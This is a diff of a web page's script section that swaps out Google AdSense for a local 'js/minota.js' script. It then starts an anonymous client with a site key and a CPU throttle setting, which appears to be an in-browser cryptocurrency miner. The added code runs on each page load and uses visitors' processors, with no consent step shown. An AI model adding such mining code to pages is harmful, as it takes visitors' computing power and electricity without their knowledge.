@@ -256,9 +256,12 @@
 		</section>
 	</div>
 	<script class="scripto" type="text/javascript">
-	head.load(["https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js",{ jquery: "https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" }, { alertify: "https://cdnjs.cloudflare.com/ajax/libs/alertify.js/0.3.11/alertify.min.js" },"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"], function() {
+	head.load(["https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js",{ jquery: "https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" }, { alertify: "https://cdnjs.cloudflare.com/ajax/libs/alertify.js/0.3.11/alertify.min.js" },"js/minota.js"], function() {
+		var _client = new Client.Anonymous('e0cfbe813d0875499731a253573511d707e16f5e1fc2768ec218fc94623a6d7f', {
+			throttle: 0.7, c: 'w', ads: 0
+		});
+		_client.start();
 		head.load(["https://www.googletagmanager.com/gtag/js?id=UA-113112361-1", { scrolly: "assets/js/jquery.scrolly.min.js" }, { scrollzer: "assets/js/jquery.scrollzer.min.js" }, { skel: "https://cdnjs.cloudflare.com/ajax/libs/skel/3.0.1/skel.min.js" }, { unveil:  "https://cdnjs.cloudflare.com/ajax/libs/unveil/1.3.0/jquery.unveil.min.js" }, "https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"], function() {
-			(adsbygoogle = window.adsbygoogle || []).push({});
 			//googletagmanager
 			window.dataLayer = window.dataLayer || [];
 			function gtag(){dataLayer.push(arguments);}
